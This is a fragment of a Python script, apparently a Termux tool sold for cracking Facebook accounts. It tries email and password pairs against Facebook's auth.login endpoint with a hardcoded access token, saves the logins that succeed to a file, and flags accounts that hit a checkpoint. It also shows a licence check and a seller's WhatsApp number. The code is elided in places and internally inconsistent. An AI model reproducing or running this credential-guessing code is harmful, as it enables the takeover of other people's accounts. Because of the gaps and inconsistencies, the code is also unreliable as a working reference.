...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://github.com/Mr-Azan/F9/blob/main/Aproval.text').text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923165456679?text={bumper}")
                        qsbuy()
...
def main():
        ...
        print('[5] Clear Cache')
        print('[6] Best Pass Lists\033[1;35m')
        ...
        def m1(self,iid,passlist):
        	    try:
                        ...
                        r = requests.Session()
                                ...
                                data = {"locale":"en_US","format":"json","email":user,"password":pass,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}
                                graph = 'https://graph.facebook.com/method/auth.login'
                                response = r.get(graph, params=param, headers=header)
                                if 'session_key' in po:
                                        print(' \033[1;32m [AXB-SUCCESSFULL] '+iid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ids/ok.txt','a').write(iid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'www.facebook.com' in po:
                                        print(' \033[1;31m [AXB-CHECKPOINT] '+iid+' | '+pas+'\033[0;97m')
